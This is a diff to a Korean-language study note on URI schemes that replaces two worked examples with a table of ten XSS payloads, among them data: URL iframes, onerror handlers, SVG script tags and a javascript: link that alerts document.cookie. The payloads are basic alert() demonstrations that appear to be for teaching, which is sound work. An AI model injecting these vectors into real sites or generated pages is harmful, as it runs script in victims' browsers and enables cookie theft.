@@ -31,55 +31,17 @@ URI 스킴을 통해 리소스를 어떻게 접근할 수 있는지, 어떤 프�
 
 ---
 
-## 💻 예제 1: `data:` URL을 이용한 XSS (iframe + script)
+## 💻 `data:` URL을 이용한 XSS 공격 주요 페이로드 정리
 
-```html
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Data URL XSS Example</title>
-</head>
-<body>
-  <h1>Data URL을 이용한 XSS 데모</h1>
-
-  <!-- iframe으로 data URL을 삽입 -->
-  <iframe src="data:text/html,
-    <script>alert('XSS! Data URL을 통해 실행됨');</script>"
-    width="0" height="0" style="display:none;">
-  </iframe>
-
-</body>
-</html>
-```
-
-### 🔍 설명:
-
-* `iframe` 태그의 `src` 속성에 `data:text/html,<script>...</script>` 형태의 **스크립트가 포함된 HTML**을 넣었습니다.
-* 브라우저는 이걸 **새 HTML 페이지처럼 인식**하고 렌더링하며, `<script>`가 실행됩니다.
-* 즉, 이 방식으로 **스크립트를 외부 로드 없이 inline으로 실행**할 수 있습니다.
-
----
-
-## 💻 예제 2: `data:` URL을 `<img>`에 쓰는 경우 (피싱이나 Clickjacking 등에 사용 가능)
-
-```html
-<!DOCTYPE html>
-<html>
-<body>
-  <h2>Data URL 이미지 삽입</h2>
-  <img src="data:image/svg+xml,
-    <svg xmlns='http://www.w3.org/2000/svg' width='300' height='100'>
-      <a href='javascript:alert(`Clicked!`)'>
-        <text x='10' y='50' font-size='30'>Click Me</text>
-      </a>
-    </svg>">
-</body>
-</html>
-```
-
-### 🔍 설명:
-
-* SVG 안에 `<a href="javascript:...">`를 넣으면, 클릭 시 자바스크립트가 실행됩니다.
-* **보안에 취약한 브라우저나 환경**에서는 이렇게 악성 스크립트가 실행될 수 있습니다.
-* 이미지처럼 보이지만, 실제로는 **인터랙티브한 스크립트 실행 트리거**로 작동할 수 있습니다.
-
+| **페이로드**                                                                                                                           | **설명**                                                         |
+| ---------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
+| `<iframe src="data:text/html,<script>alert('XSS! Data URL을 통해 실행됨');</script>"></iframe>`                                          | \*\*`<iframe>`\*\*을 이용해 \*\*`data URL`\*\*로 **XSS** 실행         |
+| `<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><a href='javascript:alert(`Clicked!`)'>Click Me</a></svg>">` | \*\*`<img>`\*\*에 **SVG**를 삽입해 **자바스크립트 실행**                    |
+| `<a href="javascript:alert('XSS Attack!')">Click Me</a>`                                                                           | **링크** 클릭 시 **자바스크립트 코드** 실행                                   |
+| `<img src="x" onerror="alert('XSS via onerror')">`                                                                                 | **`<img>`** 태그에서 **`onerror` 이벤트**를 사용한 **XSS**                |
+| `<input type="image" src="x" onerror="alert('XSS!')">`                                                                             | \*\*`<input type="image">`\*\*에서 **`onerror` 이벤트**로 **XSS** 실행 |
+| `<svg><script>alert('XSS via SVG')</script></svg>`                                                                                 | **SVG** 안에서 \*\*`<script>`\*\*를 이용한 **XSS**                    |
+| `<a href="javascript:eval('alert(document.cookie)')">Click Me</a>`                                                                 | \*\*`eval()`\*\*을 사용해 **쿠키 탈취**를 시도하는 **XSS**                  |
+| `<body background="javascript:alert('XSS')">`                                                                                      | **`background` 속성**을 통해 **자바스크립트** 실행                          |
+| `<a href="data:text/html,<script>alert('XSS from Data URL!')</script>">Click Me</a>`                                               | **`data:` URL**을 활용한 링크 클릭 시 **XSS**                           |
+| `<script src="javascript:alert('XSS')"></script>`                                                                                  | **`<script>`** 태그를 이용한 **자바스크립트 코드** 실행                        |
